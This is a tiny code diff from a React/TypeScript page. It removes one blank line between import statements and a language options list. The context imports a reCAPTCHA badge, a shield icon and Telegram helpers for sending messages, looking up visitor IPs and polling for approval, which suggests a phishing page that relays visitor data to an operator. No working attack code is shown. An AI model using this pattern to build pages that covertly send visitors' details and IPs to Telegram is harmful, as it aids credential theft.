@@ -6,7 +6,6 @@ import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
 import { sendTelegram, getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
 
-
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
   { code: "es", label: "Español" },
